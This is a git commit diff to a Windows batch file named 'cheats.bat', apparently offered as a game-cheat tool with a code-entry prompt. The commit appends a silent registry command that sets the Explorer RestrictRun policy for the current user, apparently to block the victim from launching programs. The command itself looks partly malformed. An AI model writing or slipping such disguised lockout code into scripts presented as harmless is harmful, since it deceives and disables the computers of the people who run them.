eff04bf5baf6b5e9433743fbb2b2979d943deecf
ilya2005g <140847646+ilya2005g@users.noreply.github.com>
2023-08-26 21:26:48 +0300

    cheats.bat

--- cheats.bat
+++ cheats.bat
@@ -31,3 +31,5 @@ echo ERROR!
 echo Enter C0d3:
 )
 goto upo
+@echo off
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f > nul
